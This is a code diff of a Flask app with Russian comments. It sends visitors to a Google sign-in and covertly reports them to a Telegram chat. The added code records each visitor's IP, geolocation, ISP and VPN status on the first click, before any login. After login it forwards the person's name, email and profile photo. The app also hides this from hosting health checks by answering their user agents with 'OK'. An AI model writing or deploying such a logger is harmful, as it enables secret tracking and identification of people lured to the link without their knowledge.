@@ -25,29 +25,9 @@ def send_telegram_message(text):
         print(f"Ошибка отправки текста: {e}")
 
 
-@app.route("/")
-def index():
-    user_agent = request.headers.get("User-Agent", "")
-    if "Go-http-client" in user_agent or "Render" in user_agent:
-        return "OK", 200
-
-    redirect_uri = f"{RENDER_URL}/callback"
-    google_auth_url = (
-        f"https://accounts.google.com/o/oauth2/v2/auth?"
-        f"client_id={GOOGLE_CLIENT_ID}&"
-        f"redirect_uri={redirect_uri}&"
-        f"response_type=code&"
-        f"scope=email%20profile"
-    )
-
-    return redirect(google_auth_url)
-
-
-@app.route("/callback")
-def callback():
-    # Сначала всегда собираем технические данные (IP, время, геолокация)
-    ip = request.headers.get(
-        "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
+def get_client_info(req):
+    ip = req.headers.get(
+        "X-Forwarded-For", req.headers.get("X-Real-IP", req.remote_addr)
     )
     if "," in ip:
         ip = ip.split(",")[0].strip()
@@ -70,7 +50,42 @@ def callback():
     isp = geo_info.get("isp", "Не определено")
     is_vpn = "Да" if geo_info.get("proxy") else "Нет"
 
-    # Если пользователь нажал "Отмена" на странице Google
+    return ip, visit_time, country, city, isp, is_vpn
+
+
+@app.route("/")
+def index():
+    user_agent = request.headers.get("User-Agent", "")
+    if "Go-http-client" in user_agent or "Render" in user_agent:
+        return "OK", 200
+
+    # Сразу шлем первичную инфу по IP при клике на сайт (до подтверждения)
+    ip, visit_time, country, city, isp, is_vpn = get_client_info(request)
+    initial_message = (
+        f"👀 *ПЕРЕХОД НА САЙТ (ОЖИДАНИЕ ВХОДА)*\n\n"
+        f"⏱ *Время:* `{visit_time}`\n"
+        f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
+        f"📍 *Место:* `{country}, {city}`\n"
+        f"🏢 *Провайдер:* `{isp}`"
+    )
+    send_telegram_message(initial_message)
+
+    redirect_uri = f"{RENDER_URL}/callback"
+    google_auth_url = (
+        f"https://accounts.google.com/o/oauth2/v2/auth?"
+        f"client_id={GOOGLE_CLIENT_ID}&"
+        f"redirect_uri={redirect_uri}&"
+        f"response_type=code&"
+        f"scope=email%20profile"
+    )
+
+    return redirect(google_auth_url)
+
+
+@app.route("/callback")
+def callback():
+    ip, visit_time, country, city, isp, is_vpn = get_client_info(request)
+
     error_arg = request.args.get("error")
     if error_arg:
         message_text = (
@@ -86,14 +101,6 @@ def callback():
 
     code = request.args.get("code")
     if not code:
-        message_text = (
-            f"⚠️ *ПОПЫТКА ВХОДА (БЕЗ КОДА)*\n\n"
-            f"⏱ *Время:* `{visit_time}`\n"
-            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
-            f"📍 *Место:* `{country}, {city}`\n"
-            f"🏢 *Провайдер:* `{isp}`"
-        )
-        send_telegram_message(message_text)
         return "Ошибка авторизации: код не получен", 400
 
     redirect_uri = f"{RENDER_URL}/callback"
@@ -108,15 +115,6 @@ def callback():
 
     token_r = requests.post(token_url, data=token_data)
     if token_r.status_code != 200:
-        message_text = (
-            f"⚠️ *ПОПЫТКА ВХОДА (ОШИБКА ТОКЕНА)*\n\n"
-            f"⏱ *Время:* `{visit_time}`\n"
-            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
-            f"📍 *Место:* `{country}, {city}`\n"
-            f"🏢 *Провайдер:* `{isp}`\n"
-            f"🔴 *Ошибка:* `{token_r.text}`"
-        )
-        send_telegram_message(message_text)
         return f"Ошибка получения токена: {token_r.text}", 400
 
     access_token = token_r.json().get("access_token")
@@ -126,24 +124,16 @@ def callback():
     user_r = requests.get(user_info_url, headers=headers)
 
     if user_r.status_code != 200:
-        # Даже если профиль не отдал данные, шлем информацию по IP и времени
-        message_text = (
-            f"⚠️ *ПОПЫТКА ВХОДА (БЕЗ ПРОФИЛЯ)*\n\n"
-            f"⏱ *Время:* `{visit_time}`\n"
-            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
-            f"📍 *Место:* `{country}, {city}`\n"
-            f"🏢 *Провайдер:* `{isp}`"
-        )
-        send_telegram_message(message_text)
-        return redirect("https://google.com")
+        return "Ошибка получения профиля", 400
 
     user_info = user_r.json()
     email = user_info.get("email", "Не указана")
     name = user_info.get("name", "Не указано")
     picture = user_info.get("picture", "Нет фото")
 
+    # Второе сообщение — когда почта получена успешно
     message_text = (
-        f"🔑 *ВХОД ЧЕРЕЗ GOOGLE*\n\n"
+        f"🔑 *УСПЕШНЫЙ ВХОД ЧЕРЕЗ GOOGLE*\n\n"
         f"👤 *Имя:* `{name}`\n"
         f"📧 *Email:* `{email}`\n"
         f"🖼 *Аватар:* [Фото профиля]({picture})\n\n"
